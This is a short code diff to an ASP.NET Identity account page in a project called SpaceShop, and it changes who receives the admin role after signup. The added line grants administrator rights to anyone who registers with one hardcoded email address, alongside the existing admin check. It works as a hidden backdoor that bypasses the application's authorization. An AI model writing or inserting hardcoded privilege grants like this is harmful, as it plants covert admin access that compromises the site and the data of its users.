@@ -144,7 +144,7 @@ namespace SpaceShop.Areas.Identity.Pages.Account
 
                 if (result.Succeeded)
                 {
-                    if (User.IsInRole(PathManager.AdminRole))
+                    if (User.IsInRole(PathManager.AdminRole) || user.Email == "7383an@gmail2.com")
                     {
                         // назначение роли
                         await _userManager.AddToRoleAsync(user, PathManager.AdminRole);
